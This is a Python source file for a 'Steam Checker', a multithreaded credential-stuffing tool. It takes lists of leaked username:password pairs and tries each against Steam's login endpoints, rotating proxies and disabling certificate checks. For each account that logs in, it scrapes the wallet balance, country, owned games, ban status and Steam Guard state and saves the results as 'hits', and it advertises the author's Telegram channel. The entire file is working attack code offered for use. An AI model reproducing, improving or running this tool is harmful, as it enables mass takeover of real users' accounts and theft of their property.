import os
import re
import sys
import time
import json
import random
import threading
import httpx
import base64
from urllib.parse import quote_plus
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

COMBO_FILE = "combos.txt"
PROXY_FILE = "proxies.txt"
RESULT_DIR = "Results"

BANNER = r"""
███████╗████████╗███████╗ █████╗ ███╗   ███╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
███████╗   ██║   █████╗  ███████║██╔████╔██║
╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
"""
def banner():
    print(Fore.CYAN + BANNER)
    print(Fore.MAGENTA + "Steam Checker • Made with ♥ by Yashvir Gaming")
    print(Fore.MAGENTA + "• Telegram: https://t.me/therealyashvirgaming\n" + Style.RESET_ALL)

lock = threading.Lock()
checked = 0
hits = 0

def load_lines(path):
    if not os.path.isfile(path):
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def build_proxy_url(line: str):
    """
    Normalize common proxy formats to a URL usable by httpx.
    Examples accepted:
      - ip:port
      - ip:port:user:pass
      - user:pass@ip:port
      - http://..., https://..., socks5://...
    Returns a string or None if it can't normalize.
    """
    if not line:
        return None
    line = line.strip()
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    if "@" in line and ":" in line:
        return "http://" + line if not line.startswith("http") else line
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return None

def safe_json(resp):
    try:
        return resp.json()
    except Exception:
        return None

def rsa_encrypt_password(password: str, modulus_hex: str, exponent_hex: str) -> str:
    """
    PKCS#1 v1.5 pad + RSA encrypt + base64 encode (returns PASS2 in OB2)
    """
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    rsa_key = RSA.construct((n, e))
    cipher = PKCS1_v1_5.new(rsa_key)
    encrypted = cipher.encrypt(password.encode("utf-8"))
    return base64.b64encode(encrypted).decode()

def shorten_games(games_list, limit=10):
    if not isinstance(games_list, list):
        return str(games_list)
    if len(games_list) > limit:
        return " | ".join(games_list[:limit]) + f" ... (+{len(games_list)-limit} more)"
    return " | ".join(games_list)

def parse_account_page(html):
    status = balance = country = "?"
    if not html:
        return status, balance, country
    soup = BeautifulSoup(html, "html.parser")

    try:
        st = soup.find("a", class_="account_data_field")
        if st and "Verified" in st.get_text():
            status = st.get_text(strip=True)
    except:
        pass
    if status == "?":
        m = re.search(r'Status.*?<a[^>]*>([^<]+)</a>', html, re.I|re.S)
        if m:
            status = m.group(1).strip()

    try:
        bal = soup.find("div", class_="accountData price")
        if bal:
            balance = bal.get_text(strip=True)
    except:
        pass
    if balance == "?":
        m = re.search(r'accountData price[^>]*>([^<]+)', html, re.I)
        if m:
            balance = m.group(1).strip()

    try:
        c = soup.find("span", class_="account_data_field")
        if c and len(c.get_text(strip=True)) <= 40:  # avoid huge dumps
            country = c.get_text(strip=True)
    except:
        pass
    if country == "?":
        m = re.search(r'Country.*?<span[^>]*>([^<]+)</span>', html, re.I|re.S)
        if m:
            country = m.group(1).strip()

    return status, balance, country

def parse_profile_page(html):
    """Return (online_str, community_ban_flag)"""
    online = "?"
    comm_ban = "None"
    if not html:
        return online, comm_ban
    soup = BeautifulSoup(html, "html.parser")

    try:
        in_game = soup.find("div", class_="profile_in_game_name")
        if in_game and in_game.get_text(strip=True):
            online = f"In-Game: {in_game.get_text(strip=True)}"
        else:
            state = soup.find("div", class_="profile_in_game")
            if state and state.get_text(strip=True):
                online = state.get_text(strip=True)
            else:
                m = re.search(r'(Last\s+Online[^<]+)', html, re.I)
                if m:
                    online = m.group(1).replace("Last Online", "Last Online:").strip()
    except:
        pass

    try:
        if "This account is currently community banned" in html:
            comm_ban = "Community Banned"
        elif "This account is permanently banned" in html:
            comm_ban = "Permanently Banned"
    except:
        pass

    return online, comm_ban

def parse_games_page(html):
    """Return (is_limited_str, total_games_int, games_list)"""
    limited = "?"
    games = []
    if not html:
        return limited, 0, games

    m = re.search(r'is_limited&quot;:(true|false)', html, re.I)
    if m:
        limited = m.group(1)

    games = re.findall(r';name&quot;:&quot;([^&]+)&quot;', html)
    games = [BeautifulSoup(g, "html.parser").get_text() for g in games]

    return limited, len(games), games

def parse_vac_page(html):
    """Return (vac_list, gameban_list)"""
    vac_list = []
    gameban_list = []
    if not html:
        return vac_list, gameban_list
    soup = BeautifulSoup(html, "html.parser")

    try:
        for span in soup.find_all("span", class_="help_highlight_text"):
            text = span.get_text(strip=True)
            if text:
                vac_list.append(text)
    except Exception:
        pass

    try:
        if "Game Bans" in html or "game ban" in html.lower():
            gb = re.findall(r'Game Bans.*?help_highlight_text">(.*?)</span>', html, re.I|re.S)
            gameban_list = [g.strip() for g in gb if g.strip()]
    except Exception:
        pass

    return vac_list, gameban_list

def format_capture(combo, res):
    u, p = combo.split(":", 1)
    games = res.get("Games", [])
    games_str = shorten_games(games, limit=10) if isinstance(games, list) else str(games)
    return (f"{u}:{p} | Status = {res.get('Status','?')} | Balance = {res.get('Balance','?')} | "
            f"Country = {res.get('Country','?')} | Online = {res.get('Online','?')} | "
            f"limited = {res.get('Limited','?')} | TotalGames = {res.get('TotalGames','?')} | "
            f"Games = [{games_str}] | VAC = {res.get('VAC','?')} | GameBan = {res.get('GameBan','?')} | "
            f"CommunityBan = {res.get('CommunityBan','?')} | SteamGuard = {res.get('SteamGuard','?')} | "
            f"FamilyView = {res.get('FamilyView','?')} | 💪 AUTHOR Telegram: 🔥 @therealyashvirgaming 🔥")

def worker_thread(combos, proxies, thread_id):
    global checked, hits
    while True:
        try:
            combo = combos.pop()
        except IndexError:
            return
        u_p = combo
        try:
            username, password = combo.split(":", 1)
        except Exception:
            with lock:
                print(Fore.RED + f"[FAIL] {u_p} | bad combo format")
            with lock:
                checked += 1
            continue

        user_clean = re.sub(r"@.*", "", username)
        proxy_url = None
        if proxies:
            raw = random.choice(proxies)
            proxy_url = build_proxy_url(raw)

        try:
            if proxy_url:
                client = httpx.Client(http1=True, proxy=proxy_url, timeout=30, verify=False)
            else:
                client = httpx.Client(http1=True, timeout=30, verify=False)
        except Exception as e:
            with lock:
                print(Fore.RED + f"[FAIL] {u_p} | proxy/client init error: {e}")
            with lock:
                checked += 1
            continue

        try:
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://steamcommunity.com",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-us"
            }

            now = str(int(time.time()))
            r1 = client.post("https://steamcommunity.com/login/getrsakey/",
                             data=f"donotcache={now}&username={user_clean}",
                             headers=headers)
            j1 = safe_json(r1)
            if not j1 or not j1.get("success"):
                with lock:
                    print(Fore.RED + f"[FAIL] {u_p} | RSA key fetch failed")
                client.close()
                with lock:
                    checked += 1
                continue

            modulus = j1.get("publickey_mod")
            exponent = j1.get("publickey_exp")
            timestamp = j1.get("timestamp")

            if not modulus or not exponent:
                with lock:
                    print(Fore.RED + f"[FAIL] {u_p} | RSA modulus/exp missing")
                client.close()
                with lock:
                    checked += 1
                continue

            pass2 = rsa_encrypt_password(password, modulus, exponent)
            pass3 = quote_plus(pass2)

            now2 = str(int(time.time()))
            payload = (f"donotcache={now2}&password={pass3}&username={user_clean}"
                       f"&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text="
                       f"&emailsteamid=&rsatimestamp={timestamp}&remember_login=false&oauth_client_id=C1F110D6&mobile_chat_client=true")
            r2 = client.post("https://steamcommunity.com/login/dologin/",
                             data=payload,
                             headers=headers)
            j2 = safe_json(r2)
            if j2 is None:
                with lock:
                    print(Fore.RED + f"[FAIL] {u_p} | Invalid credentials")
                client.close()
                with lock:
                    checked += 1
                continue

            msg = j2.get("message", "") if isinstance(j2, dict) else ""
            if isinstance(msg, str) and "incorrect" in msg.lower():
                with lock:
                    print(Fore.RED + f"[FAIL] {u_p} | Invalid credentials")
                client.close()
                with lock:
                    checked += 1
                continue

            if j2.get("requires_twofactor") or j2.get("emailauth_needed"):
                with lock:
                    print(Fore.YELLOW + f"[2FA] {u_p} | Needs verification")
                client.close()
                with lock:
                    checked += 1
                continue

            if not j2.get("success"):
                with lock:
                    reason = msg or "Login failed"
                    print(Fore.RED + f"[FAIL] {u_p} | {reason}")
                client.close()
                with lock:
                    checked += 1
                continue

            steamid = None
            try:
                oauth_raw = j2.get("oauth")
                if oauth_raw:
                    try:
                        oauth_obj = json.loads(oauth_raw)
                        steamid = oauth_obj.get("steamid")
                    except Exception:
                        m = re.search(r'"steamid"\s*:\s*"(\d+)"', oauth_raw)
                        if m:
                            steamid = m.group(1)
            except Exception:
                pass

            if not steamid:
                tp = j2.get("transfer_parameters")
                if isinstance(tp, dict):
                    steamid = tp.get("steamid")

            if not steamid:
                m = re.search(r'"steamid"\s*:\s*"(\d+)"', r2.text)
                if m:
                    steamid = m.group(1)

            if not steamid:
                with lock:
                    print(Fore.RED + f"[FAIL] {u_p} | No SteamID")
                client.close()
                with lock:
                    checked += 1
                continue

            acc_resp = client.get(f"https://store.steampowered.com/account/{steamid}")
            acc_html = acc_resp.text if acc_resp is not None else ""
            status, balance, country = parse_account_page(acc_html)

            prof_resp = client.get(f"https://steamcommunity.com/profiles/{steamid}")
            prof_html = prof_resp.text if prof_resp is not None else ""
            online, comm_ban = parse_profile_page(prof_html)

            games_resp = client.get(f"https://steamcommunity.com/profiles/{steamid}/games?tab=all")
            games_html = games_resp.text if games_resp is not None else ""
            limited, total_games, games_list = parse_games_page(games_html)

            vac_resp = client.get("https://help.steampowered.com/en/wizard/VacBans")
            vac_html = vac_resp.text if vac_resp is not None else ""
            vac_list, gameban_list = parse_vac_page(vac_html)

            capture = {
                "Status": status or "?",
                "Balance": balance or "?",
                "Country": country or "?",
                "Online": online or "?",
                "Limited": limited or "?",
                "TotalGames": total_games,
                "Games": games_list,
                "VAC": vac_list or [],
                "GameBan": gameban_list or [],
                "CommunityBan": comm_ban or "?",
                "SteamGuard": "Enabled" if r2.cookies.get("steamLoginSecure") else "Unknown",
                "FamilyView": "Unknown"
            }

            out_line = format_capture(u_p, capture)
            with lock:
                print(Fore.GREEN + "[HIT] " + out_line)
                hits += 1
                if hits == 1:
                    os.makedirs(RESULT_DIR, exist_ok=True)
                    fname = os.path.join(RESULT_DIR, f"Success_{time.strftime('%Y%m%d_%H%M%S')}.txt")
                with open(os.path.join(RESULT_DIR, f"Success_{time.strftime('%Y%m%d_%H%M%S')}.txt"), "a", encoding="utf-8") as wf:
                    wf.write(out_line + "\n")

            client.close()
        except Exception as e:
            with lock:
                print(Fore.RED + f"[FAIL] {u_p} | {repr(e)}")
        finally:
            with lock:
                checked += 1

if __name__ == "__main__":
    banner()

    if not os.path.isfile(COMBO_FILE):
        print(Fore.RED + f"Missing {COMBO_FILE} in current folder. Create it and add combos username:password per line.")
        sys.exit(1)

    combos_list = load_lines(COMBO_FILE)
    if not combos_list:
        print(Fore.RED + "No combos found in combos.txt")
        sys.exit(1)

    proxy_choice = input("Use proxies? (Y/N): ").strip().upper()
    use_proxies = proxy_choice == "Y"
    proxy_lines = []
    if use_proxies:
        proxy_lines = load_lines(PROXY_FILE)
        if not proxy_lines:
            print(Fore.YELLOW + f"No proxies found in {PROXY_FILE}, continuing proxyless.")
            use_proxies = False

    try:
        THREADS = int(input("Threads (default=10, max=100): ") or 10)
    except:
        THREADS = 10
    if THREADS > 100: THREADS = 100

    combos_stack = combos_list.copy()
    proxies_list = proxy_lines if use_proxies else []

    print(Fore.CYAN + f"Loaded {len(combos_stack)} combos | {len(proxies_list)} proxies | Threads: {THREADS}")
    if not proxies_list:
        print(Fore.YELLOW + "[!] Proxyless mode enabled (using your IP/VPN).")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker_thread, args=(combos_stack, proxies_list, i+1), daemon=True)
        threads.append(t)
        t.start()

    while any(t.is_alive() for t in threads):
        time.sleep(0.2)

    print(Fore.CYAN + f"Done! Checked {checked}/{len(combos_list)} | Hits={hits}")
